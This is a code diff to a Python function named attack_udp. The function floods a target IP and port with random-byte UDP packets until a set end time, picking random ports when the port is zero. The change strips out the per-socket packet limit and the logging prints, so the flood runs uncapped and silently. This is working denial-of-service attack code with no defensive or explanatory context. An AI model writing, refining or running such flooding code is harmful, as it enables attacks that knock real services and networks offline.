@@ -45,21 +45,14 @@ def detect_max_packets():
 
 
 
-def attack_udp(ip, port, end_time, size):
-    print("Attack started")
-    max_packets = 1950
-    print("detected")
-    
+def attack_udp(ip, port, end_time, size):    
     while time.time() < end_time:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             dport = random.randint(1, 65535) if port == 0 else port
-            packets_sent = 0
-            while time.time() < end_time and packets_sent < max_packets:
+            while time.time() < end_time:
                 data = os.urandom(size)
-                print(f"Sending packet to {ip}:{dport}, size={size} bytes")
                 s.sendto(data, (ip, dport))
-                packets_sent += 1
         except Exception as e:
             print("Error:", e)
             continue
